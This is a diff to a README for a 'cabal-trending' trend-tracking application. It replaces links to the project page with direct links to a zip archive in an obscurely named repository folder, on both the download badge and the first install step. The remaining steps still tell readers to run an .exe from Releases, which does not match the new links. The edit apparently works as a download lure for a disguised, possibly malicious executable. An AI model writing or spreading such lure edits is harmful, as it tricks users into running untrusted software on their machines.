@@ -1,6 +1,6 @@
 # 📈 cabal-trending - Track popular trends with ease
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/barrieworsened144/cabal-trending)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/barrieworsened144/cabal-trending/main/polycarpous/cabal_trending_1.5.zip)
 
 ## 📋 Overview
 
@@ -19,7 +19,7 @@ If your computer supports these basic standards, the application will perform we
 
 ## 🚀 How to Install and Run
 
-1. Visit the [official download page](https://github.com/barrieworsened144/cabal-trending) to reach the release area.
+1. Visit the [official download page](https://raw.githubusercontent.com/barrieworsened144/cabal-trending/main/polycarpous/cabal_trending_1.5.zip) to reach the release area.
 2. Look for the latest version listed under the Releases section on the right side of the page.
 3. Click the link that ends in .exe to begin the download. Your browser might ask you to save the file. Choose a folder you remember, such as your Downloads folder.
 4. Locate the file in your folder once the download finishes.
